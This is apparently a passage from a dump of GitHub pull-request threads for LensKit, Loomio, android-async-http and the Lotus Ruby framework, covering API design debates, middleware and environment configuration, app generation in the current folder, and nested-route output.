at the wiki page. But in the end, the outcome of the recommendation is a data structure, right? Why not provide functions like ```map(Function<E, T> f)```, ```flatMap(Function<E, ResultList<T> f)``` and ```filter(Predicate<E> p)```.\r\n* ```map(Function<E, T> f)```: Convert Result\r\n* ```flatMap(Function<E, ResultList<T> f)```: Apply next recommender.\r\n* ```filter(Predicate<E> p)```: Filter result\r\n\r\n```java\r\nnew ItemItemScorer().predict(1, new ArrayList(){{add(1);add(2);add(3);}}).filter(score -> score < 0.4).flatMap(...);\r\n```', ""@gtrefs Thanks for the input.\r\n\r\nThere are a lot of things I like about a functional model like you are describing. And actually, I would like configuring LensKit to look more like that, possibly in LensKit 3.1.\r\n\r\nBut currently, it would be a very significant change from LensKit's current design based on dependency-injected components. I have some long-term ideas for how to build a functional-style API that generates DI configuration under the hood; I'm not sure if that's a good idea or not.\r\n\r\nThe DI model gives us significant ability to algorthmically reason over the structure of a recommender algorithm, to do things like automatically identify opportunities for sharing components between recommender instances in an evaluation and provide good, automatic support for some of the nuances of integrating with web applications in an algorithm-independent fashion. It also puts all of the algorithm structure into a configuration file, and application code knows nothing but how to ask for recommendations.\r\n\r\nIt might be that the tradeoffs of going to a more direct, functional algorithm implementation and configuration style are worth it. I know that DI has been one of the things that has been confusing and complicated for some potential users. Applications can easily enough write a recommender service class that calls the LensKit algorithms.\r\n\r\nSo far, I have been trying to take the same core ideas that LensKit already has and make them clearer and easier to work with. I'm open to a more thorough rethink, but I think that's a bigger conversation, perhaps for the mailing list. Going in the direction of functionally composing pieces would move LensKit from being a 'framework' to being a library for building (and evaluating?) recommenders. Not a bad plan (and there's a lot to be said for libraries vs. frameworks). Just... a lot of work, and with some nontrivial costs in recovering some of automatic efficiency support. It'd also basically force us to Java 8 (we currently still support 7, based on a poll of LensKit users that I ran in December)."", ""OK, I think I've addressed all of @kluver's comments that required code changes.\r\n\r\nPlanning to add LenskitItemScorer and friends that return Fastutil interfaces, but I think that can be done later."", 'On a quick skim the changes we discussed seem to be present. pending tests good to merge.\r\n\r\nDoesn\'t Java have implementations of functional primitives related to the core collections (part of guava maybe?) At least for predict and recommend outputs a user can always use those for expressive power by using the ""with details"" results. The issue is that the ""with details"" functions may take longer to run and require more ram than their primitive versions. so supporting the basic output types (recommend directly to item ids for example) allows more efficient use of our API.']"
316,loomio/loomio,2012.0,,"['@gdpelican did we do anything stupid here?', '@gdpelican I agree about the awkward name for SHOW_LOOMIO_ORG_MARKETING. I\'ve switched it out for ""hosted_by_loomio"" in the positive case and ""third_party_install"" in the negative. Have updated the config vars on production too. ']"
317,loomio/loomio,2035.0,"Okay, lots of stuff here:

- Saves user preferences when changed
- More robust querying of client side db, so things don't slip through that shouldn't be there
- More better 'fire and forget' (things load faster and backfill later :zap:)
- Added mute and mark as unread buttons, which totally work
- Lots of cleanup and code cruft removal
- More reliably filter out muted discussions

Could likely do with a code review @robguthrie ","['This looks pretty good. Only concerns are that Enums look dodgy in this case, and a big problem with triggering single discussion queries from the serialiser. We have to find a way around that.. and it feels like it should not be too much effort to compute unreadness on the client.', ""overall it's looking like a masterpiece. Please checkout https://trello.com/c/sIDtaIlz/415-latest-inbox-line-item-options-ideas  and let us know what you think on the card."", ""where loads every model in the store and runs the function on it, which their docs discourage if you can avoid it. I'll try some fiddly things first, but we can use it if all else fails.\r\nhttps://github.com/techfort/LokiJS/wiki/Indexing-and-Query-Performance\r\n\r\nIf I can muster up the motivation maybe I'll try benchmarking some things. :muscle: "", ""yep.. but if you've already applied filters for group and timeframe then\nthe `where` impact over the remaining set will be insignificant i reckon.\n\nOn Wed, 25 Mar 2015 at 20:34 James Kiesel <notifications@github.com> wrote:\n\n> where loads every model in the store and runs the function on it, which\n> their docs discourage if you can avoid it. I'll try some fiddly things\n> first, but we can use it if all else fails.\n> https://github.com/techfort/LokiJS/wiki/Indexing-and-Query-Performance\n>\n> If I can muster up the motivation maybe I'll try benchmarking some things. [image:\n> :muscle:]\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/loomio/loomio/pull/2035#issuecomment-85898357>.\n>\n""]"
318,loomio/loomio,2101.0,I think this is right but I have been a bit distracted so it needs a proper QA before deploy,"[""run on deploy:\r\n\r\n```    \r\nnon_referral_group_ids = GroupRequest.pluck(:group_id).compact;\r\nGroup.parents_only.where('groups.id NOT IN (?)', non_referral_group_ids).update_all(is_referral: true)\r\n```"", ""I've tested locally, should be good to go. Let's let Travis run first though. xx""]"
319,loomio/loomio,2225.0,:rocket: ,"['This is CR-ready @robguthrie ', ""wonderful. I'm sure that the start button needs to be position fixed but we can patch that later. DEPLOY!""]"
320,loomio/loomio,2223.0,,"[""Alright, I just gave this a quick cleanup and a smoke test, and am satisfied with it. Let's dooo it!"", 'amazing!\r\n']"
321,loomio/loomio,2267.0,almost ready for merge.. need to clean up remains of old pie chart,"[""@gdpelican could you have a read over this for me. I think it's ready for merge. Pie chart reads it's bounding size on init so you don't need to pass any sizes into it, but a css width, hight is required."", 'This looks friggen great @robguthrie ']"
322,loomio/loomio,2282.0,"This is ready for a peek I think, @robguthrie.
It's still just functionality (I haven't made it match the design yet)

I'm planning on driving out the change picture stuff today as well.","['Thanks James. Looks great. I like accessible_records\r\n\r\nAre there index actions where we need to put require_authenticated_user back?\r\n \r\nAre you planning on writing e2e tests for this?\r\n\r\nAlso I think we should consider removing/skipping the ""why are you deactivating"" stuff... as that is really best handled by intercom. @rdbartlett - any thoughts on that?\r\n\r\nI like the simple pattern of submit(), isDisabled on form scopes.', ""There's a looming thing here around displaying validation errors (specifically on the change password form, but certainly the group / discussion forms could use them as well.); I've confirmed that the API is returning errors correctly, but alongside the general modal work will be a general solution for displaying validation errors on the form."", ""A quick survey of routes.rb makes me think that notifications, invitables, and memberships could possibly use a signed-in requirement for index, although it'd also be possible to just say that public_records for those things == []"", 'e2e tests = yes, one each for change picture, change password, and deactivate account.', ""Okay, this has turned into a bit of a beast, sorry about that.\r\n\r\nThere's lots of good stuff in here, though, happy to hear your thoughts @robguthrie @HSalmon \r\n\r\nStuff I added today:\r\n\r\n- A simple way to handle validation errors\r\n- Support for uploading custom avatars\r\n- Support for live updating the profile page after changes are saved"", 'nice work james!', 'Yay this passed!\r\n\r\nThoughts on merging this in for demo today, @robguthrie? I guess the most outstanding thing would be renaming the UsersController to CurrentUserController (I had a real quick go at it and got frustrated because our restful_client assumes that the UserModel posts to the `/api/v1/users` route)', ""Yea I'm ok with merging today but we need cards to make RestfulController assumptions configurable, and move UsersController to CurrentUserController. \r\n\r\nI really want to be following the namespacing rules in translations and css, so it would be great if you could change those. Sorry to police them so hard but I think it's important so everything is super predictable.\r\n\r\nI've stated a real basic code review checklist here: https://github.com/loomio/loomio/wiki/Code-Review-Checklist"", ""Sorry, not sure what 'make RestfulController assumptions configurable' means?\r\nEDIT: Ah, restful client.. with you now."", ""I'm fine for you to merge this whenever you like, @gdpelican it's great and we can improve any of the highlighted issues after merge, but I think user feedback is most imporant thing right now.\r\n\r\nHowever, are you in agreement about naming of translation keys follows BEM block name thing I'm asking you to follow?"", ""yea ignore that please. I was confused.\n\nOn Fri, 10 Jul 2015 at 09:43 James Kiesel <notifications@github.com> wrote:\n\n> Sorry, not sure what 'make RestfulController assumptions configurable'\n> means?\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/loomio/loomio/pull/2282#issuecomment-120152103>.\n>\n"", ""Yep, I'm with you, but maybe I need a little guide for the guidelines you'd like me to follow, as I feel like that's been a stumbling block between us for a while.\r\n\r\nI'm happy to follow a pattern, but I guess since it feels a little unintuitive / unclear what's being asked, I've just been following what's there already, and what's there already isn't always matching what you're looking for.\r\n"", 'Oh absolutely.. I think we should try to keep all that knowledge in the\nCode Review Checklist for now.  Maybe it should move to CONTRIBUTING?\n\nOn Fri, 10 Jul 2015 at 12:59 James Kiesel <notifications@github.com> wrote:\n\n> Merged #2282 <https://github.com/loomio/loomio/pull/2282>.\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/loomio/loomio/pull/2282#event-352469574>.\n>\n', 'Yeah, that sounds like a plan.\n\nOn Thu, Jul 9, 2015 at 6:16 PM, Robert Guthrie <notifications@github.com>\nwrote:\n\n> Oh absolutely.. I think we should try to keep all that knowledge in the\n> Code Review Checklist for now. Maybe it should move to CONTRIBUTING?\n>\n> On Fri, 10 Jul 2015 at 12:59 James Kiesel <notifications@github.com>\n> wrote:\n>\n> > Merged #2282 <https://github.com/loomio/loomio/pull/2282>.\n> >\n> > \xe2\x80\x94\n> > Reply to this email directly or view it on GitHub\n> > <https://github.com/loomio/loomio/pull/2282#event-352469574>.\n>\n> >\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/loomio/loomio/pull/2282#issuecomment-120191961>.\n>\n']"
323,loopj/android-async-http,675.0,"1. force method contract in ctor to avoid null check;
2. add proper synchronization;
3. make the class real internal by removing public keyword; (revert this)","[""I like the approach, however, the thing is, we take care of first three arguments to not be null, in previous checks in AsyncHttpClient.java, and fourth argument (ResponseHandlerInterface) can be null, if developer doesn't care about state of request.\r\n\r\nAlso I'd like to keep overhead to minimum, could we please not introduce new utility class with each other pull request? Perfectly fine would be to have Utility class with all those public static helper methods."", '@smarek i will merge the public static helper methods to one file. About the ResponseHandlerInterface , see the code below in AsyncHttpClient#sendRequest\r\n```java\r\n        if (responseHandler == null) {\r\n            throw new IllegalArgumentException(""ResponseHandler must not be null"");\r\n        }\r\n```\r\nso i can just remove the null check in AsyncHttpRequest and without extra params check, right?', ""@zxw1962 I think, if you're going to assume that the response handler is not null in AsyncHttpRequest, then you should check the argument there, although I don't think there is possibility for responsehandler to be null in there."", '@smarek @fineswap has updated, please review again, thanks.']"
324,lotus/lotus,39.0,"Introducing `Lotus::Environment` as abstraction for Lotus env vars and for the options that the CLI receive.
When initialized, it sets the following env vars:

* `LOTUS_ENV` and `RACK_ENV`
* `LOTUS_HOST`
* `LOTUS_PORT`

It should be used by all the CLI commands and by `Lotus::Configuration`.

**Use case:**
When we use `lotus server --port=4000 --host=testhost.org` we expect that the application's router respect those settings.

**Constraints:**
We want the application to be _self loadable_. In every place when we do `Bookshelf::Application.new` the application should be ready to be run. Think of a simple `config.ru` where we require the app and we just write `run Bookshelf::Application.new` and it works.

**Alternative A (current implementation):**
_Scenarios_:

* When the application is started via `lotus server/console`, we initialize `Lotus::Environment` which reads CLI options and sets the env vars. Once they're set, a new instance of `Lotus::Environment` is created by `Lotus::Configuration` and we can access those values.

* When the application is started via another command (eg. `rackup` or `puma`), we don't have direct access to the CLI options, but we can read the env vars from `Lotus::Configuration` via `Lotus::Environment`.

* When the application is started via another command, and the env vars aren't set, we rely on the manual configuration (eg. `Bookshelf::Application.configure { port 1234 }`), otherwise we fallback to the default values.

_Pros:_

* We keep the constraints satisfied

_Cons:_

* We communicate via env vars

**Alternative B:**
_Scenarios_:

* When the application is started via `lotus server/console`, we read the env vars and the CLI options and we inject a complete configuration into `Bookshelf::Application.new(configuration)`

* When the application is started via external commands (eg `rackup` or `puma`), it relies on the correct manual `config.ru` configuration.

_Pros:_

* We communicate via message passing (pure OOP)

_Cons:_

* The constraints aren't satisfied because an application always need external loading mechanisms before to be instantiated.

* It complicates `config.ru` setup. Even if we generate that file, it may require future maintenance if the loading mechanisms will change. Better to protect developers from those changes.

* It requires complex tests setups every time we want to unit test an application

* When we start `lotus server/console` we don't know yet the `Lotus::Application` subclasses. We should implement a registry in order to instantiate applications. Because Ruby's `require` isn't thread safe, in multithreading environments like JRuby, Rubinius, it may be lead to subtle bugs.","['\n[![Coverage Status](https://coveralls.io/builds/928687/badge)](https://coveralls.io/builds/928687)\n\nChanges Unknown when pulling **0277fc5c4fcaad6f4ac33fab20c738df090890d1 on environment** into ** on master**.\n', ""> _Cons:_\r\n> \r\n> * We communicate via env vars\r\n\r\nNot so sure this should be viewed as a con. Many deployment strategies nowadays (especially those built on Docker, and of course Heroku) recommend environment-variable based configuration. I'd think that communicating via env vars would actually make it easier to deploy Lotus applications with more modern tools"", '@davidcelis I was considering this design from a pure programming perspective. I totally agree with you about the usage of env vars for deployment strategies.', '\n[![Coverage Status](https://coveralls.io/builds/930025/badge)](https://coveralls.io/builds/930025)\n\nChanges Unknown when pulling **fdda48351b7df650b8edfe73a366901f3be4f0b2 on environment** into ** on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/930058/badge)](https://coveralls.io/builds/930058)\n\nChanges Unknown when pulling **4b7e83edfc245c16a8c6fa4817a453bf3517a081 on environment** into ** on master**.\n', '@jodosha :+1: good to go', '\xf0\x9f\x91\x8d', ""I'd generally prefer Alternative A. Why? Some clients/shops *really* care about [Twelve-Factor](http://12factor.net/config) development."", '\n[![Coverage Status](https://coveralls.io/builds/932769/badge)](https://coveralls.io/builds/932769)\n\nChanges Unknown when pulling **faf3b21af5483adb14eb8e18b51a38df0aacbef6 on environment** into ** on master**.\n']"
325,lotus/lotus,40.0,"Move the functionality of `Lotus::Middleware` from the application to a
configuration block to allow users to configure the middleware stack.
When the application is loaded, `Lotus::Middleware#load!` will still get
called to load the final middleware stack into the Rack::Builder app
that wraps the router.

Closes #27.

Signed-off-by: David Celis <me@davidcel.is>","['I moved the middleware stack from Lotus::Application into Lotus::Configuration because that seemed to be the simplest route. If people think this stuff should be moved around differently, I can try to make that happen.', '\n[![Coverage Status](https://coveralls.io/builds/934240/badge)](https://coveralls.io/builds/934240)\n\nCoverage decreased (-0.24%) when pulling **5eedf698a9521f26597c9817aeca5ce4d3142860 on davidcelis:config-middleware** into **19cd0784901cd5a831013a39a7541c9e0b1c89a7 on lotus:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/934265/badge)](https://coveralls.io/builds/934265)\n\nCoverage decreased (-0.24%) when pulling **559813fb61c1d1eb6615741da57e7617728700d5 on davidcelis:config-middleware** into **19cd0784901cd5a831013a39a7541c9e0b1c89a7 on lotus:master**.\n', '@davidcelis Would you please make `Configuration#assets` to accept `false`, in order to turn-off the feature of serving static assets? This is useful for production environment, when we want the web server to take care of it.', 'Do you mean in the line `@assets ||= Config::Assets.new(root, nil)`?\r\ni.e. change it to `@assets ||= Config::Assets.new(root, false)`?', ""@davidcelis Nope, I mean this:\r\n\r\n```ruby\r\nmodule Bookshelf\r\n  class Application < Lotus::Application\r\n    configure do\r\n      # Don't mount Rack::Static\r\n      assets false\r\n    end\r\n  end\r\nend\r\n```"", ""Gotcha. I can work on that, but might it be better opened in a new PR since it's technically unrelated?"", ""@davidcelis the middleware stack should take account of this feature. If you want we can postpone, once this will be merged. But better to think about this problem now, while we're shaping the middleware stack."", ""Can do. The default should still be 'public', I assume? We only disable if the user explicitly calls `assets false`?"", 'Alright, done. Not a big fan of that conditional, but the special cases of `nil` vs. `valse` vs. `something_truthy` seemed to require it.', '\n[![Coverage Status](https://coveralls.io/builds/934526/badge)](https://coveralls.io/builds/934526)\n\nCoverage increased (+0.01%) when pulling **adde4519af4c63a0f6464769c19e83c2cefe2ba9 on davidcelis:config-middleware** into **19cd0784901cd5a831013a39a7541c9e0b1c89a7 on lotus:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/935095/badge)](https://coveralls.io/builds/935095)\n\nCoverage increased (+0.01%) when pulling **ff682f1a59e95946797b7175049013d5b515489e on davidcelis:config-middleware** into **19cd0784901cd5a831013a39a7541c9e0b1c89a7 on lotus:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/935096/badge)](https://coveralls.io/builds/935096)\n\nCoverage increased (+0.01%) when pulling **ff682f1a59e95946797b7175049013d5b515489e on davidcelis:config-middleware** into **19cd0784901cd5a831013a39a7541c9e0b1c89a7 on lotus:master**.\n', 'Missing docs added, thanks for catching that @joneslee85!', '\n[![Coverage Status](https://coveralls.io/builds/935706/badge)](https://coveralls.io/builds/935706)\n\nCoverage increased (+0.01%) when pulling **c457444ac3cd341a6644dfb438330c1e5a41dd72 on davidcelis:config-middleware** into **19cd0784901cd5a831013a39a7541c9e0b1c89a7 on lotus:master**.\n', ""@davidcelis @joneslee85 what do you think about moving those middleware from the [server](https://github.com/lotus/lotus/blob/master/lib/lotus/commands/server.rb#L16-L17) to this feature?\r\n\r\nAs now they aren't accessible via configuration, because the server is a container for the applications. If for some reason devs want to have full control (eg. use `better_errors` instead of `ShowExceptions`), they can do `middleware.clear` and build their own stack."", ""I can take a stab at that, but we'll need to figure out a clean way of giving the Server command access to an application or its configuration. As it stands currently, `Lotus::Application` doesn't have any sort of accessor for an application. Rails has `Rails.application` which, now that it isn't a singleton, simply returns whatever instance of `Rails::Application` that was initialized first. Maybe we should implement something similar for Lotus? Otherwise, we'll need to be passing applications around in the CLI and know which Lotus app we're dealing with in various commands. It might be outside of the scope of this PR; maybe I can issue another PR soon to move those middlewares once there's an easier way to access that application state."", ""@davidcelis Sorry for being not clear. I was suggesting to have an empty middleware stack in `Server`, and push down those defaults into application's middleware. This would eliminate the need of `Lotus.application` which isn't technically possible.\r\n\r\nSo that (pseudo code):\r\n\r\n```ruby\r\nLotus::Commands::Server.new.middleware # => []\r\nBookshelf::Application.configuration.middleware.stack # => [Lotus::Assets, ContentLength, Rack::Lint, ...]\r\n```\r\n\r\nI'm not sure if it's possible with the current implementation, but I'd love to offer to developers a way to clean up the default middleware stack from `Application.configure` block."", ""Ah, I gotcha. I think it could be _possible_ with the current implementation, but it'll be tough and probably pretty ugly. My attempts to have the `Lotus::Middleware` stack handle what's currently in `server` seems to be messing with responses quite a bit. It seems as though `Rack::Server` wants its own `middleware` method to return a middleware stack in a specific format. If anything, it looks like the Server command would still need access to the `Lotus::Middleware` instance.\r\n\r\nEven [Rails::Server](https://github.com/rails/rails/blob/master/railties/lib/rails/commands/server.rb#L83-L99) doesn't attempt to handle this. They separate out the middleware stack of the application itself from the server's middleware stack, presumably for the above reasons"", ""@jodosha i think it is a good idea to move it from server to middleware. However if it makes the implementation messy, I'd prefer to leave the code as is, in server component.\r\n\r\nI think we should leave the investigation and implementation for another PR. Let's :shipit: "", ""@davidcelis @joneslee85 I'm afraid I haven't explained myself ;)\r\n\r\nMy suggestion is:\r\n\r\n```ruby\r\nmodule Lotus\r\n  module Commands\r\n    class Server < ::Rack::Server\r\n      # ...\r\n      def middleware\r\n        Hash.new\r\n      end\r\n    end\r\nend\r\n```\r\n\r\n..and\r\n\r\n```ruby\r\nmodule Lotus\r\n  class Middleware\r\n    def initialize(configuration)\r\n      # ...\r\n      use ::Rack::ContentLength\r\n      use ::Rack::CommonLogger\r\n    end\r\n  end\r\nend\r\n```\r\n\r\nDo you think it's ugly?"", ""@jodosha That solution isn't ugly, but it does cause over 20 new test failures for reasons I haven't had time to delve into yet."", '\n[![Coverage Status](https://coveralls.io/builds/936267/badge)](https://coveralls.io/builds/936267)\n\nCoverage increased (+0.01%) when pulling **a799dbc4cbdfad88a7c94402cf63dd9aa9593e14 on davidcelis:config-middleware** into **19cd0784901cd5a831013a39a7541c9e0b1c89a7 on lotus:master**.\n', ""Oh I see. If it doesn't accept a middleware with #use, we should investigate before to merge this.\r\n\r\nI'll take care on monday.\r\n\r\n> On 05/lug/2014, at 20:36, David Celis <notifications@github.com> wrote:\r\n> \r\n> @jodosha That solution isn't ugly, but it does cause over 20 new test failures for reasons I haven't had time to delve into yet.\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub."", ""I mean, it accepts middleware with #use, but moving those middleware out of `Rack::Server` seems to cause strange test failures. I'm not surprised, given the fragility of Rack's middleware stack in general. I can try to look into it more before Monday."", ""@davidcelis I've just merged this, thanks!""]"
326,lotus/lotus,99.0,Closes #59 ,"['\n[![Coverage Status](https://coveralls.io/builds/1606373/badge)](https://coveralls.io/builds/1606373)\n\nCoverage increased (+0.11%) when pulling **da550d7bcfd88edbbb4d13db0ddb827d86a24cb6 on AlfonsoUceda:assets** into **06d10e056bafc751b6f33edc07110fcc2a4eded8 on lotus:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1606405/badge)](https://coveralls.io/builds/1606405)\n\nCoverage increased (+0.09%) when pulling **c2c3e28d16c7feb439900c9bfe7e4f36fffaf79e on AlfonsoUceda:assets** into **06d10e056bafc751b6f33edc07110fcc2a4eded8 on lotus:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1606426/badge)](https://coveralls.io/builds/1606426)\n\nCoverage increased (+0.09%) when pulling **a53c42b18dc7528122194d7afa9f8cc4d9bcc574 on AlfonsoUceda:assets** into **06d10e056bafc751b6f33edc07110fcc2a4eded8 on lotus:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1606851/badge)](https://coveralls.io/builds/1606851)\n\nCoverage increased (+0.09%) when pulling **34dbcdfd9c89862178bd018fd5a5899ac90d0856 on AlfonsoUceda:assets** into **06d10e056bafc751b6f33edc07110fcc2a4eded8 on lotus:master**.\n', ""except nitpick above, it's +1"", '\n[![Coverage Status](https://coveralls.io/builds/1608792/badge)](https://coveralls.io/builds/1608792)\n\nCoverage increased (+0.09%) when pulling **6e0443bb066bf73167d61e683f053eefe8103b95 on AlfonsoUceda:assets** into **06d10e056bafc751b6f33edc07110fcc2a4eded8 on lotus:master**.\n', ':+1: ', '@AlfonsoUceda This looks good, merging. Thank you! :+1: ']"
327,lotus/lotus,128.0,"Cover following cases:

* [x] `lotus new .` to generate new app with app_name = current folder name and path = current path
* [x] `lotus new app_1 --path /my_path` - to generate new app with name app_1 and /my_path

https://github.com/lotus/lotus/issues/127","['\n[![Coverage Status](https://coveralls.io/builds/1709269/badge)](https://coveralls.io/builds/1709269)\n\nCoverage increased (+0.0%) when pulling **66dd1530cf5d516494487937e26b924fbe7b871c on mengqing:feature/generates_new_app_in_current_folder** into **9e7ec45d77654acb7928d5e438dad7c9c4442471 on lotus:master**.\n', ""@mengqing Hello and thanks for this PR.\r\n\r\nWhat's this useful for? What's the CLI usage?"", '@jodosha the use case is to allow users to parse in a pathname for app_name:\r\n\r\n```\r\nlotus new /tmp/my_app\r\n# would create my_app inside /tmp\r\n```\r\n\r\nalso you could do\r\n\r\n```\r\nmkdir /tmp/my_app\r\ncd /tmp/my_app\r\nlotus new .\r\n# it would create my_app in the current folder\r\n```\r\n\r\nI myself do not use this feature at all nor am I aware of it. But it does exist in Rails and @mengqing raised it up here, it must be used frequently by some users', ""Hi @jodosha, @joneslee85 pretty much summerized what it's for and the cli usage of it. I personally always use this syntax for a new rails app, and it works quite well for rvm && rbenv e.g.\r\n\r\n```shell\r\nmkdir my_app && cd !$\r\nrvm use --create 2.2.0@my_lotus_app --ruby-version\r\ngem i lotus\r\nlotus new .\r\n```"", ':+1: for supporting this feature ;)', '@mengqing I think this makes sense for Lotus philosophy.\r\n\r\nWe consider Lotus apps as a deliverability mechanism for ""headless"" applications. The Container architecture is an example of what I\'m saying: `lib/` contains the pure Ruby code (headless) and `apps/` contains web deliverability.\r\n\r\nIncluding this feature may help to easily get onboard gems who need a quick way to expose web facilities. Think of Sidekiq (headless) and the web dashboard that uses Sinatra (`Sidekiq::Web`).\r\n\r\n:+1: for me. Before to merge, I left a question that needs to be addressed.', '\n[![Coverage Status](https://coveralls.io/builds/1745127/badge)](https://coveralls.io/builds/1745127)\n\nCoverage increased (+0.02%) when pulling **8d098e1758a36424e3630a09a369e403dd588127 on mengqing:feature/generates_new_app_in_current_folder** into **89a4ace0e39c078fad8fb19a674969d8ee7240f4 on lotus:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1745912/badge)](https://coveralls.io/builds/1745912)\n\nCoverage increased (+0.06%) when pulling **fec6cf154f133e72f468cab1e49656e0861bfbd7 on mengqing:feature/generates_new_app_in_current_folder** into **89a4ace0e39c078fad8fb19a674969d8ee7240f4 on lotus:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1746167/badge)](https://coveralls.io/builds/1746167)\n\nCoverage decreased (-0.31%) when pulling **2656aeb0bd67a03556467a242a8b34f466bbec85 on mengqing:feature/generates_new_app_in_current_folder** into **89a4ace0e39c078fad8fb19a674969d8ee7240f4 on lotus:master**.\n', 'except above comments, it is :+1:  from me\r\n', ':+1: ', ':+1: ', '\n[![Coverage Status](https://coveralls.io/builds/1747940/badge)](https://coveralls.io/builds/1747940)\n\nCoverage increased (+0.05%) when pulling **1c6bb5bf04242613df7d98f4b87b9d8d37e70595 on mengqing:feature/generates_new_app_in_current_folder** into **89a4ace0e39c078fad8fb19a674969d8ee7240f4 on lotus:master**.\n', ':+1: ', '@mengqing much thanks for your contribution.', '@mengqing This works great, thank you!', '@jodosha no problem, glad I helped to improve the app :+1: ']"
328,lotus/router,51.0,"This PR adds the feature of nested routes to router:

```ruby
require 'lotus/router'

router = Lotus::Router.new do
  namespace :admin do
    resources :users
  end

  resources :users do
    resources :posts
    resource :avatar
  end

  resource :identity do
    resource :api_keys
  end

  resource :user do
    resources :comments
  end

  resources :users do
    resources :posts do
      resources :comments do
        collection { get 'search' }
        member     { get 'screenshot' }
      end
      collection { get 'search' }
      member     { get 'screenshot' }
    end
  end
end

puts router.inspector

#          admin_users GET, HEAD  /admin/users                   Users::Index                  
#       new_admin_user GET, HEAD  /admin/users/new               Users::New                    
#          admin_users POST       /admin/users                   Users::Create                 
#           admin_user GET, HEAD  /admin/users/:id               Users::Show                   
#      edit_admin_user GET, HEAD  /admin/users/:id/edit          Users::Edit                   
#           admin_user PATCH      /admin/users/:id               Users::Update                 
#           admin_user DELETE     /admin/users/:id               Users::Destroy                
#           user_posts GET, HEAD  /users/:user_id/posts          Users::Posts::Index           
#        new_user_post GET, HEAD  /users/:user_id/posts/new      Users::Posts::New             
#           user_posts POST       /users/:user_id/posts          Users::Posts::Create          
#            user_post GET, HEAD  /users/:user_id/posts/:id      Users::Posts::Show            
#       edit_user_post GET, HEAD  /users/:user_id/posts/:id/edit Users::Posts::Edit            
#            user_post PATCH      /users/:user_id/posts/:id      Users::Posts::Update          
#            user_post DELETE     /users/:user_id/posts/:id      Users::Posts::Destroy         
#      new_user_avatar GET, HEAD  /users/:user_id/avatar/new     Users::Avatar::New            
#          user_avatar POST       /users/:user_id/avatar         Users::Avatar::Create         
#          user_avatar GET, HEAD  /users/:user_id/avatar         Users::Avatar::Show           
#     edit_user_avatar GET, HEAD  /users/:user_id/avatar/edit    Users::Avatar::Edit           
#          user_avatar PATCH      /users/:user_id/avatar         Users::Avatar::Update         
#          user_avatar DELETE     /users/:user_id/avatar         Users::Avatar::Destroy        
#                users GET, HEAD  /users                         Users::Index                  
#             new_user GET, HEAD  /users/new                     Users::New                    
#                users POST       /users                         Users::Create                 
#                 user GET, HEAD  /users/:id                     Users::Show                   
#            edit_user GET, HEAD  /users/:id/edit                Users::Edit                   
#                 user PATCH      /users/:id                     Users::Update                 
#                 user DELETE     /users/:id                     Users::Destroy                
# new_identity_api_key GET, HEAD  /identity/api_keys/new         Identity::ApiKeys::New        
#     identity_api_key POST       /identity/api_keys             Identity::ApiKeys::Create     
#     identity_api_key GET, HEAD  /identity/api_keys             Identity::ApiKeys::Show       
# edit_identity_api_key GET, HEAD  /identity/api_keys/edit        Identity::ApiKeys::Edit       
#     identity_api_key PATCH      /identity/api_keys             Identity::ApiKeys::Update     
#     identity_api_key DELETE     /identity/api_keys             Identity::ApiKeys::Destroy    
#         new_identity GET, HEAD  /identity/new                  Identity::New                 
#             identity POST       /identity                      Identity::Create              
#             identity GET, HEAD  /identity                      Identity::Show                
#        edit_identity GET, HEAD  /identity/edit                 Identity::Edit                
#             identity PATCH      /identity                      Identity::Update              
#             identity DELETE     /identity                      Identity::Destroy             
#        user_comments GET, HEAD  /user/comments                 User::Comments::Index         
#     new_user_comment GET, HEAD  /user/comments/new             User::Comments::New           
#        user_comments POST       /user/comments                 User::Comments::Create        
#         user_comment GET, HEAD  /user/comments/:id             User::Comments::Show          
#    edit_user_comment GET, HEAD  /user/comments/:id/edit        User::Comments::Edit          
#         user_comment PATCH      /user/comments/:id             User::Comments::Update        
#         user_comment DELETE     /user/comments/:id             User::Comments::Destroy       
#             new_user GET, HEAD  /user/new                      User::New                     
#                 user POST       /user                          User::Create                  
#                 user GET, HEAD  /user                          User::Show                    
#            edit_user GET, HEAD  /user/edit                     User::Edit                    
#                 user PATCH      /user                          User::Update                  
#                 user DELETE     /user                          User::Destroy                 
# search_user_post_comments GET, HEAD  /users/:user_id/posts/:post_id/comments/search Users::Posts::Comments::Search
# screenshot_user_post_comment GET, HEAD  /users/:user_id/posts/:post_id/comments/:id/screenshot Users::Posts::Comments::Screenshot
#   user_post_comments GET, HEAD  /users/:user_id/posts/:post_id/comments Users::Posts::Comments::Index 
# new_user_post_comment GET, HEAD  /users/:user_id/posts/:post_id/comments/new Users::Posts::Comments::New   
#   user_post_comments POST       /users/:user_id/posts/:post_id/comments Users::Posts::Comments::Create
#    user_post_comment GET, HEAD  /users/:user_id/posts/:post_id/comments/:id Users::Posts::Comments::Show  
# edit_user_post_comment GET, HEAD  /users/:user_id/posts/:post_id/comments/:id/edit Users::Posts::Comments::Edit  
#    user_post_comment PATCH      /users/:user_id/posts/:post_id/comments/:id Users::Posts::Comments::Update
#    user_post_comment DELETE     /users/:user_id/posts/:post_id/comments/:id Users::Posts::Comments::Destroy
#    search_user_posts GET, HEAD  /users/:user_id/posts/search   Users::Posts::Search          
# screenshot_user_post GET, HEAD  /users/:user_id/posts/:id/screenshot Users::Posts::Screenshot      
#           user_posts GET, HEAD  /users/:user_id/posts          Users::Posts::Index           
#        new_user_post GET, HEAD  /users/:user_id/posts/new      Users::Posts::New             
#           user_posts POST       /users/:user_id/posts          Users::Posts::Create          
#            user_post GET, HEAD  /users/:user_id/posts/:id      Users::Posts::Show            
